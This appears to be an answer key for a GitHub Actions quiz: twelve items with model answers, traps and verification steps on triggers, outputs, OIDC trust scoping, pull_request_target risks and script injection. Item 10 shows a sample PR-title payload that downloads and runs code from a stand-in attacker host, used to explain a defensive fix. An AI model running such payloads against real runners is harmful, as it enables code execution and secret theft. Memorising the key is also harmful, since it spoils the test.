1. **Competent:** Both are right about costs, but **the trigger is the higher-leverage fix**: without `branches:` filtering, every push to every branch fires the full matrix and the production deploy. Adding `branches: [main]` (or the appropriate branch filter) immediately eliminates all feature-branch runs. The matrix tuning is secondary — if the trigger is wrong, optimizing the matrix still deploys on every branch push. **Trap:** fixing `fail-fast` or reducing matrix dimensions without addressing the missing `branches:` filter. **Verify:** confirm the workflow no longer runs on non-main pushes after adding the branch filter.

2. **Competent:** No, `GITHUB_ENV` only propagates environment variables to **subsequent steps within the same job** — it does not cross job boundaries. The correct mechanism is to write the URL to `$GITHUB_OUTPUT` in the build step (with `echo "url=<value>" >> $GITHUB_OUTPUT`), declare it as a job output under `outputs:`, and reference it in the notify job via `${{ needs.release.outputs.url }}`. **Trap:** believing `GITHUB_ENV` is like a global environment that flows to dependent jobs. **Verify:** the notify job can read the URL; if `GITHUB_ENV` were used it would be empty in the notify job.

3. **Competent:** No — GitHub Actions enforces a **maximum nesting depth of 4 levels** for reusable workflow calls. A caller chain of caller → A → B → C → D attempts 5 levels and will **fail at workflow parse/run time** with an error about nesting depth exceeded. The fix is to flatten the chain: inline the innermost workflow's logic into its caller or compose it differently. **Trap:** assuming nesting is unlimited, or guessing a different limit (some recall "3" — the limit is 4, meaning 4 reusable workflows deep from the caller). **Verify:** the failing workflow's run shows a nesting-depth error message.

4. **Competent:** No, the action will **fail on GitHub-hosted runners**. GitHub-hosted runners execute the file listed in `runs.main` directly; there is no `npm install` or compile step. The pre-compiled `dist/` must be committed to the repo because the runner only downloads the repo contents. `act` runs locally where you may have the source already installed/transpiled, masking the bug. Fix: run `npm run build` (or `ncc compile`) and commit the output to `dist/`, pointing `action.yml` at `dist/index.js`. **Trap:** trusting `act` results as equivalent to GitHub-hosted runner behavior. **Verify:** the action succeeds in a real GitHub workflow run referencing the committed `dist/`.

5. **Competent:** `aws-actions` is a **GitHub-verified creator**, so the policy "GitHub-authored and verified creators" already permits it — no allowlist change is needed. The team can use `aws-actions/configure-aws-credentials` without any administrator intervention. **Trap:** assuming any third-party action requires an explicit allowlist entry, or that "verified" only means GitHub's own `actions/` org. **Verify:** use the action in a workflow; confirm it runs without a policy block error in the Actions UI.

6. **Competent:** This is the classic `pull_request_target` code-execution attack. The trigger runs in the context of the **base repo** (with secrets access), but checking out and running the PR contributor's code gives the contributor's arbitrary code access to the repository's secrets and write-permission token. The fix is to **never check out and execute untrusted PR-head code in a `pull_request_target` workflow**. If the build is genuinely needed, split it: a `pull_request` workflow (no secrets) runs the test, and a separate `workflow_run` or manual step handles the privileged label action. **Trap:** believing `contents: read` alone prevents secret leakage — the token and any other secrets in scope are still accessible to code running in that workflow context. **Verify:** no step in the `pull_request_target` workflow executes code from the PR head ref.

7. **Competent:** The trust condition `repo:my-org/*` grants any repository in `my-org` the ability to assume this IAM role, including all branches, all workflows, and all environments. A compromised or malicious workflow in any repo in the org can escalate to the role's full AWS privileges. The condition must be **scoped to the specific repo, branch, and/or environment**, e.g., `repo:my-org/deploy-repo:ref:refs/heads/main` or `repo:my-org/deploy-repo:environment:production`. **Trap:** thinking org-scoped trust is acceptable because the org is "private" or "trusted." **Verify:** the trust policy now only accepts tokens whose `sub` claim matches the specific repo and ref or environment.

8. **Competent:** Re-running the entire matrix is wasteful. GitHub Actions allows **re-running individual failed matrix jobs** directly from the Actions UI (click the failed job, then "Re-run job" or "Re-run failed jobs"). This reruns only the broken combination rather than all four. The developer should use this targeted re-run. **Trap:** re-running the full matrix workflow to confirm a fix — this consumes 4× the compute and time unnecessarily. **Verify:** only the previously-failed matrix combination is re-run and its result is confirmed.

9. **Competent:** With `cancel-in-progress: true`, the new hot-fix push to `main` will **immediately cancel the 80%-complete production deployment**. This leaves the production environment in a partial or intermediate state — potentially broken. For the default/release branch, the correct setting is `cancel-in-progress: false`, so queued runs wait their turn rather than cancelling in-progress ones. Reserve `cancel-in-progress: true` for branch-based preview or PR deploys where partial deploys don't endanger production. **Trap:** assuming `cancel-in-progress: true` is universally correct for CD workflows, or that the cancelled run can safely be restarted from where it left off. **Verify:** on main, subsequent pushes queue rather than cancel the running deployment.

10. **Competent:** Interpolating `${{ github.event.pull_request.title }}` directly into the `run:` script is a **script injection vulnerability**. A PR title containing shell metacharacters (e.g., `$(curl attacker.com | sh)`) executes arbitrary code on the runner. The fix: pass the value through an environment variable and reference the variable in the shell, which treats it as data not code:
    ```yaml
    env:
      PR_TITLE: ${{ github.event.pull_request.title }}
    run: echo "$PR_TITLE" | grep -E 'PROJ-[0-9]+'
    ```
    **Trap:** adding quotes around the `${{ }}` expression inside the `run:` string — shell quoting does not help because the expression is expanded before the shell sees it. **Verify:** a PR title with `$(id)` or backtick payloads does not execute the embedded command.

11. **Competent:** The new member is **partially right but wrong about redundancy**. GitHub's immutable action enforcement on GitHub-hosted runners does close the tag-mutation attack vector for those runners. However, SHA pinning remains the best practice for three reasons: (1) self-hosted runners are not covered by GHCR immutability enforcement, (2) a SHA pin provides exact auditability — reviewers can verify precisely what code ran, and (3) the GHCR enforcement is a platform behavior, not a guarantee against all supply-chain risks. SHA pinning is the authoritative defense; tag-only pinning relies on a platform guarantee that could change. **Trap:** fully accepting the new member's argument and removing SHA pins from workflows that run on self-hosted runners. **Verify:** the workflow still references a full commit SHA with a tag comment; self-hosted runner jobs resolve the same code.

12. **Competent:** The called workflow's job sees **both**: `secrets: inherit` passes the calling workflow's org/repo secrets into the called workflow's context, and because the job targets the `production` environment, the **environment secrets for that environment are also injected** (and take precedence over same-named repo/org secrets). The environment's required reviewer gate still applies — the job pauses for approval before any secrets are available. **Trap:** assuming `secrets: inherit` only provides org/repo-level secrets and that environment secrets require explicit mapping, or conversely that environment secrets are absent because only `inherit` was specified. **Verify:** log (or set-output with) a non-sensitive environment secret inside the called workflow's job to confirm it resolves correctly after reviewer approval.
